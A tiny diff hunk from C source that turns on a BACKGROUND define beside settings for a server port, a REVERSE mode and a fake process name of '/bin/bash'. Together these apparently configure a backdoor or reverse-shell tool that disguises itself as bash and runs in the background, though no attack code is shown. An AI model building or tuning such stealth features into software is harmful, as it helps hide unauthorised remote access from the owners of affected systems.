@@ -25,7 +25,7 @@ typedef unsigned long int word;
 #define SERVERPORT 7586
 #define FAKENAME "/bin/bash"
 
-//#define BACKGROUND
+#define BACKGROUND
 #define REVERSE
 //#define DEBUG
 //#define EXIT goto catch
